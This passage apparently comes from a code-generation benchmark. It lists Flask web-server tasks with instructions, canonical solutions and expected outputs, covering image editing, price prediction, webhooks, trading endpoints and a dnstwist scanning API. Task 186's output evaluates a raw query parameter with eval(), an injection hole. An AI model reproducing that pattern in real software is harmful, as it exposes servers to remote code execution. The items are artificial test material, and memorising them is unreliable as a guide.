    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route(\"/adjust\", methods=[\"GET\", \"POST\"])\ndef do_adjust():\n    if request.method == \"POST\":\n        the_file = request.files[\"the_file\"]\n        brightness = request.form[\"brightness\"]\n        contrast = request.form[\"contrast\"]\n        import adjust\n\n        return adjust.do_adjust(the_file, brightness, contrast)\n    else:\n        return render_template(\"adjust.html\")\n\n@app.route(\"/enhance\", methods=[\"GET\", \"POST\"])\ndef do_enhance():\n    if request.method == \"POST\":\n        the_file = request.files[\"the_file\"]\n        amount = request.form[\"amount\"]\n        import enhance\n\n        return enhance.do_enhance(the_file, amount)\n    else:\n        return render_template(\"enhance.html\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template, send_file\nimport io\nfrom PIL import Image\nimport numpy as np\n\napp = Flask(__name__)\n\ndef do_adjust(image, brightness, contrast):\n    img = np.array(image)\n    img = img.astype(np.float32)\n    img = img / 255.0\n    img = img * (1 + float(brightness)) + float(contrast) * (img - 0.5)\n    img = np.clip(img, 0, 1)\n    img = (img * 255).astype(np.uint8)\n    return Image.fromarray(img)\n\ndef do_enhance(image, amount):\n    img = np.array(image)\n    img = img.astype(np.float32)\n    img = img / 255.0\n    img = img * (1 + float(amount))\n    img = np.clip(img, 0, 1)\n    img = (img * 255).astype(np.uint8)\n    return Image.fromarray(img)\n\n@app.route('/adjust', methods=['GET', 'POST'])\ndef adjust():\n    if request.method == 'GET':\n        return render_template('adjust.html')\n    else:\n        file = request.files['the_file']\n        brightness = request.form['brightness']\n        contrast = request.form['contrast']\n        image = Image.open(file.stream)\n        processed_image = do_adjust(image, brightness, contrast)\n        img_byte_arr = io.BytesIO()\n        processed_image.save(img_byte_arr, format='PNG')\n        encoded_img = img_byte_arr.getvalue()\n        return send_file(io.BytesIO(encoded_img), mimetype='image/png')\n\n@app.route('/enhance', methods=['GET', 'POST'])\ndef enhance():\n    if request.method == 'GET':\n        return render_template('enhance.html')\n    else:\n        file = request.files['the_file']\n        amount = request.form['amount']\n        image = Image.open(file.stream)\n        processed_image = do_enhance(image, amount)\n        img_byte_arr = io.BytesIO()\n        processed_image.save(img_byte_arr, format='PNG')\n        encoded_img = img_byte_arr.getvalue()\n        return send_file(io.BytesIO(encoded_img), mimetype='image/png')\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that predicts home prices based on input parameters.\n\nFunction Description: The function `predict_home_price` is a Flask route handler that processes incoming HTTP requests (GET or POST) containing home features, uses these features to predict a home price, and returns the estimated price as a JSON response with CORS headers enabled.\n\nInput:\n- `total_sqft`: [float] - Total square footage of the home\n- `location`: [str] - Location of the home\n- `bhk`: [int] - Number of bedrooms/hall/kitchen\n- `bath`: [int] - Number of bathrooms\n\nOutput:\n- [JSON] - A JSON response containing the key 'estimated_price' with the predicted value, and CORS headers allowing access from any origin.",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport util\n\napp = Flask(__name__)\n\n@app.route('/predict_home_price', methods=['GET', 'POST'])\ndef predict_home_price():\n    total_sqft = float(request.form['total_sqft'])\n    location = request.form['location']\n    bhk = int(request.form['bhk'])\n    bath = int(request.form['bath'])\n\n    response = jsonify({\n        'estimated_price': util.get_estimated_price(location,total_sqft,bhk,bath)\n    })\n    response.headers.add('Access-Control-Allow-Origin', '*')\n\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\n\napp = Flask(__name__)\nCORS(app)\n\ndef predict_home_price(total_sqft, location, bhk, bath):\n    # Placeholder prediction logic\n    base_price = 1000000\n    price = base_price + (total_sqft * 5000) + (bhk * 20000) + (bath * 10000)\n    return price\n\n@app.route('/predict', methods=['GET', 'POST'])\ndef predict():\n    total_sqft = float(request.args.get('total_sqft'))\n    location = request.args.get('location')\n    bhk = int(request.args.get('bhk'))\n    bath = int(request.args.get('bath'))\n    \n    estimated_price = predict_home_price(total_sqft, location, bhk, bath)\n    \n    return jsonify({\n        'estimated_price': estimated_price\n    })\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 183,
    "Instruction": "Task Description: Create a Flask-based HTTP server to process PagerDuty webhook events, decode and validate the incoming data, and insert relevant event information into BigQuery.\n\nFunction Description: The code consists of two main functions: \n1. `index()` - The Flask route handler that receives and validates incoming POST requests containing PagerDuty events\n2. `process_pagerduty_event()` - Processes and transforms the raw PagerDuty event data into a structured format for BigQuery insertion\n\nInput:\n- For `index()`: HTTP POST request with JSON payload containing PagerDuty event data\n- For `process_pagerduty_event()`: A message dictionary containing base64-encoded PagerDuty event data\n\nOutput:\n- For `index()`: Returns HTTP 204 (No Content) response after processing\n- For `process_pagerduty_event()`: Returns a structured dictionary containing processed PagerDuty event data ready for BigQuery insertion",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        event = process_pagerduty_event(msg)\n        print(f\" Event which is to be inserted into Big query {event}\")\n        if event:\n            shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(f\"EXCEPTION raised  {json.dumps(entry)}\")\n    return \"\", 204\n\ndef process_pagerduty_event(msg):\n    metadata = json.loads(base64.b64decode(msg[\"data\"]).decode(\"utf-8\").strip())\n\n    print(f\"Metadata after decoding {metadata}\")\n\n    signature = shared.create_unique_id(msg)\n    event = metadata['event']\n    event_type = event[\"event_type\"]\n    types = {\"incident.triggered\", \"incident.resolved\"}\n    if event_type not in types:\n        raise Warning(\"Unsupported PagerDuty event: '%s'\" % event_type)\n\n    pagerduty_event = {\n        \"event_type\": event_type,\n        \"id\": event['id'],\n        \"metadata\": json.dumps(metadata),\n        \"signature\": signature,\n        \"msg_id\": msg[\"message_id\"],\n        \"time_created\" : event['occurred_at'],\n        \"source\": \"pagerduty\",\n        }\n\n    print(f\"Pager Duty event to metrics--------> {pagerduty_event}\")\n    return pagerduty_event",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport base64\nimport json\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\n\ndef process_pagerduty_event(message):\n    encoded_data = message.get('payload', '').encode('utf-8')\n    decoded_data = base64.b64decode(encoded_data).decode('utf-8')\n    event_data = json.loads(decoded_data)\n    \n    # Example processing - extract relevant fields\n    processed_data = {\n        'event_id': event_data.get('id'),\n        'trigger_id': event_data.get('trigger_id'),\n        'status': event_data.get('status'),\n        'created_at': event_data.get('created_at'),\n        'updated_at': event_data.get('updated_at'),\n        'source': event_data.get('source'),\n        'event_type': event_data.get('type'),\n        'details': event_data.get('details', {})\n    }\n    \n    return processed_data\n\n@app.route('/', methods=['POST'])\ndef index():\n    data = request.get_json()\n    if not data or 'payload' not in data:\n        return Response(status=400)\n    \n    try:\n        process_pagerduty_event(data)\n        return Response(status=204)\n    except Exception as e:\n        return Response(str(e), status=500)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 184,
    "Instruction": "Task Description: Create a Flask web application that serves different data views through specific routes, rendering them using a template.\n\nFunction Description: The application defines multiple route handlers that fetch different types of data and render them using a common template ('index.html'). Each route corresponds to a different data view (main, corporate, and job data).\n\nInput:\n- Route paths ('/', '/corp', '/job') as HTTP endpoints\n- HTTP GET requests to these endpoints\n\nOutput:\n- Rendered HTML responses using the 'index.html' template with respective data and title\n- HTTP responses with status code 200 for successful renders\n\nMethods:\n- index() -> HTML - Handles root route ('/') and renders main data view\n- corp() -> HTML - Handles '/corp' route and renders corporate data view\n- job() -> HTML - Handles '/job' route and renders job data view\n\nNote: The actual data fetching is delegated to external functions (SourceData(), CorpData(), JobData()) which return objects containing the required data and title. The template 'index.html' should be prepared to handle the 'form' and 'title' variables passed from these route handlers.",
    "Canonical_solution": "from flask import Flask, render_template\nfrom data import *\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    data = SourceData()\n    return render_template('index.html', form=data, title=data.title)\n\n@app.route('/corp')\ndef corp():\n    data = CorpData()\n    return render_template('index.html', form=data, title=data.title)\n\n@app.route('/job')\ndef job():\n    data = JobData()\n    return render_template('index.html', form=data, title=data.title)\n\nif __name__ == \"__main__\":\n    app.run(host='127.0.0.1', debug=False)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "```python\nfrom flask import Flask, render_template\n\napp = Flask(__name__)\n\ndef SourceData():\n    return {\"form\": \"main_form\", \"title\": \"Main Data\"}\n\ndef CorpData():\n    return {\"form\": \"corp_form\", \"title\": \"Corporate Data\"}\n\ndef JobData():\n    return {\"form\": \"job_form\", \"title\": \"Job Data\"}\n\n@app.route('/')\ndef index():\n    data = SourceData()\n    return render_template('index.html', form=data['form'], title=data['title'])\n\n@app.route('/corp')\ndef corp():\n    data = CorpData()\n    return render_template('index.html', form=data['form'], title=data['title'])\n\n@app.route('/job')\ndef job():\n    data = JobData()\n    return render_template('index.html', form=data['form'], title=data['title'])\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 185,
    "Instruction": "Task Description: Create a Flask-based web service that predicts customer churn probability using a pre-trained machine learning model and feature transformation pipeline.\n\nFunction Description: The function implements a prediction endpoint for a Flask web service that takes customer data as input, applies feature transformation, makes a churn probability prediction using a pre-trained model, and returns the prediction results in JSON format.\n\nInput: \n- HTTP POST request with JSON body containing customer features/attributes\n- The function internally uses two pre-loaded artifacts:\n  - 'dv.bin': A feature transformation pipeline (DictVectorizer)\n  - 'model1.bin': A pre-trained machine learning model\n\nOutput: \n- JSON response containing:\n  - 'churn_probability': float value representing the predicted probability of churn (between 0 and 1)\n  - 'churn': boolean indicating whether the customer is predicted to churn (probability \u2265 0.5)",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nfrom flask import jsonify\nimport pickle\n\ndef load(filename):\n    with open(filename, 'rb') as f_in:\n        return pickle.load(f_in)\n\ndv = load('dv.bin')\nmodel = load('model1.bin')\n\napp = Flask('churn')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    customer = request.get_json()\n    X = dv.transform([customer])\n    y_pred = model.predict_proba(X)[0, 1]\n    churn = y_pred >= 0.5\n    result = {\n        'churn_probability': float(y_pred),\n        'churn': bool(churn)\n    }\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host='0.0.0.0', port=9696)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport joblib\n\napp = Flask(__name__)\n\n# Load pre-trained model and feature transformer\nmodel = joblib.load('model1.bin')\ndv = joblib.load('dv.bin')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    customer_data = request.get_json()\n    X = dv.transform([customer_data])\n    prediction = model.predict_proba(X)[0][1]\n    churn = prediction >= 0.5\n    return jsonify({\n        'churn_probability': float(prediction),\n        'churn': bool(churn)\n    })\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 186,
    "Instruction": "Task Description: Create a Flask-based HTTP server that provides endpoints to interact with an agent's trading system, including checking inventory, queue, balance, executing trades, and resetting capital.\n\nFunction Description: The code establishes a RESTful API using Flask that allows clients to query and modify the state of a trading agent. Each endpoint handles specific functionality and returns JSON responses.\n\nInput:\n- For '/trade' endpoint: GET request with 'data' parameter in query string containing trade details as JSON\n- For '/reset' endpoint: GET request with 'money' parameter in query string containing new capital amount as JSON\n- Other endpoints: GET requests without parameters\n\nOutput:\n- All endpoints return JSON responses:\n  - '/': {'status': 'OK'}\n  - '/inventory': Agent's inventory data\n  - '/queue': Agent's queue data\n  - '/balance': Agent's capital amount\n  - '/trade': Result of trade operation\n  - '/reset': Boolean confirmation of capital reset",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/', methods = ['GET'])\ndef hello():\n    return jsonify({'status': 'OK'})\n\n@app.route('/inventory', methods = ['GET'])\ndef inventory():\n    return jsonify(agent._inventory)\n\n@app.route('/queue', methods = ['GET'])\ndef queue():\n    return jsonify(agent._queue)\n\n@app.route('/balance', methods = ['GET'])\ndef balance():\n    return jsonify(agent._capital)\n\n@app.route('/trade', methods = ['GET'])\ndef trade():\n    data = json.loads(request.args.get('data'))\n    return jsonify(agent.trade(data))\n\n@app.route('/reset', methods = ['GET'])\ndef reset():\n    money = json.loads(request.args.get('money'))\n    agent.reset_capital(money)\n    return jsonify(True)\n\nif __name__ == '__main__':\n    app.run(host = '0.0.0.0', port = 8005)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated agent state\nagent_state = {\n    'inventory': {'stock_a': 100, 'stock_b': 50},\n    'queue': ['buy stock_a', 'sell stock_b'],\n    'balance': 10000\n}\n\n@app.route('/')\ndef index():\n    return jsonify({'status': 'OK'})\n\n@app.route('/inventory')\ndef inventory():\n    return jsonify(agent_state['inventory'])\n\n@app.route('/queue')\ndef queue():\n    return jsonify(agent_state['queue'])\n\n@app.route('/balance')\ndef balance():\n    return jsonify({'balance': agent_state['balance']})\n\n@app.route('/trade')\ndef trade():\n    data = request.args.get('data')\n    try:\n        trade_details = eval(data)\n        # Simulate trade execution\n        result = {\n            'action': trade_details['action'],\n            'symbol': trade_details['symbol'],\n            'quantity': trade_details['quantity'],\n            'status': 'success'\n        }\n        return jsonify(result)\n    except Exception as e:\n        return jsonify({'error': str(e)})\n\n@app.route('/reset')\ndef reset():\n    money = request.args.get('money')\n    try:\n        new_capital = float(money)\n        agent_state['balance'] = new_capital\n        return jsonify({'reset': True})\n    except ValueError:\n        return jsonify({'reset': False, 'error': 'Invalid money value'})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 187,
    "Instruction": "Task Description: Create a Flask-based HTTP server that provides endpoints for retrieving Zhihu (a Chinese Q&A platform) topic data, including topic lists and specific topic details.\n\nFunction Description: The server exposes two main endpoints:\n1. `/zhihu_get_topics_list/` - Searches for topics matching a given keyword\n2. `/zhihu_get_topics_data/` - Retrieves detailed data for a specific topic\n\nInput: \n- For `/zhihu_get_topics_list/`: \n  - POST request with form parameter \"key\" (string) - the search keyword\n- For `/zhihu_get_topics_data/`:\n  - POST request with form parameters:\n    - \"id\" (string) - topic ID\n    - \"name\" (string) - topic name\n\nOutput:\n- For `/zhihu_get_topics_list/`:\n  - JSON response with structure:\n    {\n      \"success\": integer (1 for success, 0 for failure),\n      \"data\": list of objects with \"id\" and \"name\" for matching topics\n    }\n- For `/zhihu_get_topics_data/`:\n  - JSON response containing detailed topic data (structure depends on GetData_zhihu implementation)\n\nThe server maintains caches for:\n1. All available topics (zhihu_all_topics)\n2. Search results (zhihu_all_topics_key)\n3. Initial topic data (zhihu_init_topics)",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport logging\nimport GetData_zhihu\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"hard to guess string\"\n\nzhihu_all_topics = GetData_zhihu.get_all_topics()\nzhihu_all_topics_key = {}\nzhihu_init_topics = GetData_zhihu.get_topic_data(topic_id=\"19559424\", topic_name=\"\u6570\u636e\u5206\u6790\")\n\n@app.route(\"/zhihu_get_topics_list/\", methods=[\"post\"])\ndef zhihu_get_topics_list():\n    key = request.form.get(\"key\")\n    result = {\"success\": 1, \"data\": []}\n    if key:\n        if key in zhihu_all_topics_key:\n            result = zhihu_all_topics_key[key]\n        else:\n            for item in zhihu_all_topics:\n                if item[1].find(key) >= 0:\n                    result[\"data\"].append({\"id\": item[0], \"name\": item[1]})\n            if len(result[\"data\"]) > 0:\n                result[\"success\"] = 1\n                zhihu_all_topics_key[key] = result\n                logging.debug(\"all_topics_key increase: %s\", len(zhihu_all_topics_key))\n    return jsonify(result)\n\n@app.route(\"/zhihu_get_topics_data/\", methods=[\"post\"])\ndef zhihu_get_topics_data():\n    if request.form[\"id\"] == \"19554449\":\n        result = zhihu_init_topics\n    else:\n        result = GetData_zhihu.get_topic_data(request.form[\"id\"], request.form[\"name\"])\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=logging.DEBUG, format=\"%(asctime)s\\t%(levelname)s\\t%(message)s\")\n    logging.debug(\"app url_map: %s\", app.url_map)\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\nimport time\n\napp = Flask(__name__)\n\n# Simulated cache data\nzhihu_all_topics = []\nzhihu_all_topics_key = {}\nzhihu_init_topics = {}\n\ndef get_data_from_zhihu(topic_id):\n    # Simulated function to fetch data from Zhihu\n    return {\n        \"id\": topic_id,\n        \"name\": \"Sample Topic\",\n        \"description\": \"This is a sample description for the topic.\",\n        \"questions\": [\n            {\"id\": \"1\", \"title\": \"Question 1\", \"answer\": \"Answer 1\"},\n            {\"id\": \"2\", \"title\": \"Question 2\", \"answer\": \"Answer 2\"}\n        ]\n    }\n\n@app.route('/zhihu_get_topics_list/', methods=['POST'])\ndef zhihu_get_topics_list():\n    key = request.form.get('key')\n    if not key:\n        return jsonify({\"success\": 0, \"data\": []})\n    \n    # Check cache first\n    if key in zhihu_all_topics_key:\n        return jsonify({\"success\": 1, \"data\": zhihu_all_topics_key[key]})\n    \n    # Simulate fetching topics from Zhihu\n    # In a real scenario, this would involve API calls or database queries\n    # For demonstration, we'll use a static list of topics\n    simulated_topics = [\n        {\"id\": \"1\", \"name\": \"Python\"},\n        {\"id\": \"2\", \"name\": \"Machine Learning\"},\n        {\"id\": \"3\", \"name\": \"Data Science\"},\n        {\"id\": \"4\", \"name\": \"Artificial Intelligence\"},\n        {\"id\": \"5\", \"name\": \"Web Development\"}\n    ]\n    \n    # Filter topics by keyword\n    matched_topics = [topic for topic in simulated_topics if key.lower() in topic['name'].lower()]\n    \n    # Update cache\n    zhihu_all_topics_key[key] = matched_topics\n    zhihu_all_topics.extend(matched_topics)\n    \n    return jsonify({\"success\": 1, \"data\": matched_topics})\n\n@app.route('/zhihu_get_topics_data/', methods=['POST'])\ndef zhihu_get_topics_data():\n    topic_id = request.form.get('id')\n    topic_name = request.form.get('name')\n    \n    if not topic_id or not topic_name:\n        return jsonify({\"success\": 0, \"data\": {}})\n    \n    # Check cache first\n    if topic_id in zhihu_init_topics:\n        return jsonify({\"success\": 1, \"data\": zhihu_init_topics[topic_id]})\n    \n    # Simulate fetching data from Zhihu\n    data = get_data_from_zhihu(topic_id)\n    \n    # Update cache\n    zhihu_init_topics[topic_id] = data\n    \n    return jsonify({\"success\": 1, \"data\": data})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 188,
    "Instruction": "Task Description: Create a Flask-based web application that handles form submissions and displays responses, using a class structure to encapsulate the application logic.\n\nClass Description: The `FlaskApp` class encapsulates a Flask web application that provides two routes: a main page with a form and a submission handler that processes the form data. It uses WTForms for form validation and template rendering for responses.\n\nAttributes:\n\napp: [Flask] - The Flask application instance that handles HTTP requests and routes.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the Flask application and sets up the routes by calling _setup_routes.\n\n_setup_routes: [Name]() -> [None] - Configures the application routes by binding URL paths to their respective handler methods.\n\nindex: [Name]() -> [str] - Handles requests to the root URL ('/'), renders and returns the main form page using the 'first_app.html' template with an instance of HelloForm.\n\nhello: [Name]() -> [str] - Handles POST requests to the '/hello' URL, validates the submitted form data, and either renders a greeting page ('hello.html') with the submitted name or returns the form page with validation errors.\n\nrun: [Name](debug: [bool] = True) -> [None] - Starts the Flask development server with optional debug mode enabled.",
    "Canonical_solution": "from flask import Flask, request\nfrom wtforms import Form, TextAreaField, validators\n\nclass HelloForm(Form):\n    sayhello = TextAreaField('', [validators.DataRequired()])\n\nclass FlaskApp:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/hello', methods=['POST'])(self.hello)\n\n    def index(self):\n        form = HelloForm(request.form)\n        return render_template('first_app.html', form=form)\n\n    def hello(self):\n        form = HelloForm(request.form)\n        if request.method == 'POST' and form.validate():\n            name = request.form['sayhello']\n            return render_template('hello.html', name=name)\n        return render_template('first_app.html', form=form)\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "class FlaskApp:\n    def __init__(self):\n        from flask import Flask\n        from wtforms import Form, StringField, validators\n        from flask import render_template, request, redirect, url_for\n\n        self.app = Flask(__name__)\n        self.app.config['SECRET_KEY'] = 'your_secret_key'\n        self.HelloForm = Form([('name', StringField('Name', [validators.Required()])])\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def index():\n            form = self.HelloForm()\n            return render_template('first_app.html', form=form)\n\n        @self.app.route('/hello', methods=['POST'])\n        def hello():\n            form = self.HelloForm(request.form)\n            if form.validate():\n                return render_template('hello.html', name=form.name.data)\n            return render_template('first_app.html', form=form)\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)"
  },
  {
    "Task_id": 189,
    "Instruction": "Task Description: Create a Flask-based web server that handles both GET and POST requests for a messaging webhook, verifying tokens and processing incoming messages or postbacks from a chat platform.\n\nFunction Description: The code implements a Flask application with two main route handlers:\n1. handle_verification: Handles GET requests for webhook verification by checking a token\n2. handle_messages: Processes POST requests containing message or postback events from users\n\nInput:\n- For handle_verification:\n  - GET request with query parameters:\n    - hub.verify_token: Token to verify webhook authenticity\n    - hub.challenge: Challenge string to return if verification succeeds\n- For handle_messages:\n  - POST request with JSON payload containing:\n    - Either message events (text, attachments, quick replies) or postback events\n    - Sender information and message content\n\nOutput:\n- For handle_verification:\n  - Returns the hub.challenge string if verification succeeds\n  - Returns a rendered HTML template if verification fails\n- For handle_messages:\n  - Returns \"ok\" status after processing messages\n  - May send responses back to users through the messaging platform\n  - Handles various message types (text, location, audio) and postbacks\n\nAdditional Helper Functions:\n- get_type_from_payload: Identifies whether payload contains message or postback\n- postback_events: Generator that yields sender_id and postback payload\n- messaging_events: Generator that processes different message types and yields structured data",
    "Canonical_solution": "import sys, json\nfrom flask import Flask, request, g, session, render_template, redirect, url_for, flash\nfrom flask_oauth import OAuth\n\napplication = Flask(__name__, instance_relative_config=True, static_url_path='')\napplication.config.from_object('config')\napplication.config.from_pyfile('config.py', silent=True)\napp = application\n\n@app.route('/', methods=['GET'])\ndef handle_verification():\n    if request.args.get('hub.verify_token', '') == app.config['OWN_WEBHOOK_TOKEN']:\n        return request.args.get('hub.challenge', '')\n    else:\n        return render_template('index.html')\n\n@app.route('/', methods=['POST'])\ndef handle_messages():\n    payload = request.get_data()\n    token = app.config['PAT']\n    webhook_type = get_type_from_payload(payload)\n\n    if webhook_type == 'postback':\n        for sender_id, postback_payload in postback_events(payload):\n            if postback_payload == 'OPTIMIST_HELP':\n                handle_help(sender_id)\n            elif postback_payload == 'OPTIMIST_GET_STARTED':\n                if not Mongo.user_exists(users, sender_id):\n                    g.user = Mongo.get_user_mongo(users, sender_id)\n                    return handle_first_time_user(users, g.user)\n\n    elif webhook_type == 'message':\n        for sender_id, message in messaging_events(payload):\n            if not message:\n                return \"ok\"\n            global temp_message_id \n            mid = message['message_id']\n            if mid == temp_message_id:\n                return 'ok'\n            temp_message_id = mid\n\n            try:\n                FB.show_typing(token, sender_id)\n                response = processIncoming(sender_id, message)\n                FB.show_typing(token, sender_id, 'typing_off')\n\n                if response is not None and response != 'pseudo':\n                    FB.send_message(token, sender_id, response)\n                elif response != 'pseudo':\n                    if NLP.randOneIn(7):\n                        FB.send_message(token, sender_id, NLP.oneOf(NLP.no_response))\n            except Exception, e:\n                FB.send_message(app.config['PAT'], sender_id, NLP.oneOf(NLP.error))\n                Mongo.pop_context(users, g.user)\n    return \"ok\"\n\ndef get_type_from_payload(payload):\n    data = json.loads(payload)\n    if \"postback\" in data[\"entry\"][0][\"messaging\"][0]:\n        return \"postback\"\n    elif \"message\" in data[\"entry\"][0][\"messaging\"][0]:\n        return \"message\"\n\ndef postback_events(payload):\n    data = json.loads(payload)\n    postbacks = data[\"entry\"][0][\"messaging\"]\n    for event in postbacks:\n        sender_id = event[\"sender\"][\"id\"]\n        postback_payload = event[\"postback\"][\"payload\"]\n        yield sender_id, postback_payload\n\ndef messaging_events(payload):\n    data = json.loads(payload)\n    messaging_events = data[\"entry\"][0][\"messaging\"]\n    for event in messaging_events:\n        sender_id = event[\"sender\"][\"id\"]\n        if \"message\" not in event:\n            yield sender_id, None\n        if \"message\" in event and \"text\" in event[\"message\"] and \"quick_reply\" not in event[\"message\"]:\n            data = event[\"message\"][\"text\"].encode('unicode_escape')\n            yield sender_id, {'type':'text', 'data': data, 'message_id': event['message']['mid']}\n        elif \"attachments\" in event[\"message\"]:\n            if \"location\" == event['message']['attachments'][0][\"type\"]:\n                coordinates = event['message']['attachments'][0]['payload']['coordinates']\n                yield sender_id, {'type':'location','data':[coordinates['lat'], coordinates['long']],'message_id': event['message']['mid']}\n            elif \"audio\" == event['message']['attachments'][0][\"type\"]:\n                audio_url = event['message']['attachments'][0]['payload']['url']\n                yield sender_id, {'type':'audio','data': audio_url, 'message_id': event['message']['mid']}\n            else:\n                yield sender_id, {'type':'text','data':\"I don't understand this\", 'message_id': event['message']['mid']}\n        elif \"quick_reply\" in event[\"message\"]:\n            data = event[\"message\"][\"quick_reply\"][\"payload\"]\n            yield sender_id, {'type':'quick_reply','data': data, 'message_id': event['message']['mid']}\n        else:\n            yield sender_id, {'type':'text','data':\"I don't understand this\", 'message_id': event['message']['mid']}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, render_template\nimport json\n\napp = Flask(__name__)\n\ndef get_type_from_payload(payload):\n    if 'postback' in payload:\n        return 'postback'\n    elif 'message' in payload:\n        return 'message'\n    else:\n        return 'unknown'\n\ndef postback_events(payload):\n    for event in payload.get('events', []):\n        if 'postback' in event:\n            yield event['postback']['payload'], event['sender']['id']\n\ndef messaging_events(payload):\n    for event in payload.get('events', []):\n        if 'message' in event:\n            message = event['message']\n            sender_id = event['sender']['id']\n            if 'text' in message:\n                yield sender_id, message['text']\n            elif 'location' in message:\n                yield sender_id, message['location']\n            elif 'audio' in message:\n                yield sender_id, message['audio']\n            elif 'attachment' in message:\n                yield sender_id, message['attachment']\n            elif 'quick_replies' in message:\n                yield sender_id, message['quick_replies']\n            else:\n                yield sender_id, str(message)\n\n@app.route('/', methods=['GET'])\ndef handle_verification():\n    hub_verify_token = request.args.get('hub.verify_token')\n    hub_challenge = request.args.get('hub.challenge')\n    \n    if hub_verify_token == 'your_verification_token':\n        return hub_challenge\n    else:\n        return render_template('verification.html')\n\n@app.route('/', methods=['POST'])\ndef handle_messages():\n    data = request.json\n    if get_type_from_payload(data) == 'postback':\n        for payload, sender_id in postback_events(data):\n            # Process postback events\n            print(f\"Postback from {sender_id}: {payload}\")\n    elif get_type_from_payload(data) == 'message':\n        for sender_id, message in messaging_events(data):\n            # Process message events\n            print(f\"Message from {sender_id}: {message}\")\n    return jsonify({'status': 'ok'})\n\nif __name__ == '__main__':\n    app.run(port=5000)"
  },
  {
    "Task_id": 192,
    "Instruction": "Task Description: Create a Flask-based API for domain name permutation and scanning using dnstwist library, with session management and various output formats.\n\nClass Description: DNSTwistAPI is a Flask application that provides RESTful endpoints for generating domain permutations, scanning for registered domains, and returning results in multiple formats. It manages concurrent scan sessions with cleanup functionality.\n\nAttributes:\n\napp: [Flask] - The Flask application instance\nsessions: [list] - List of active scan sessions\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the Flask app, sets up routes, and starts the session janitor thread\n_setup_routes: [Name]() -> [None] - Configures all API endpoints and their handlers\n_start_janitor: [Name]() -> [None] - Starts the background thread for cleaning up expired sessions\njanitor: [Name](sessions) -> [None] - Background thread that cleans up completed or expired sessions\nroot: [Name]() -> [Response] - Serves the web application's main page\napi_scan: [Name]() -> [tuple(Response, int)] - Creates a new scan session and starts domain permutation\napi_status: [Name](sid) -> [Response] - Returns the status of a specific scan session\napi_domains: [Name](sid) -> [Response] - Returns registered domains from a scan session\napi_csv: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results in CSV format\napi_json: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results in JSON format\napi_list: [Name](sid) -> [tuple(str, int, dict)] - Returns scan results as plain text list\napi_stop: [Name](sid) -> [Response] - Stops a running scan session\nrun: [Name](host, port) -> [None] - Starts the Flask application server",
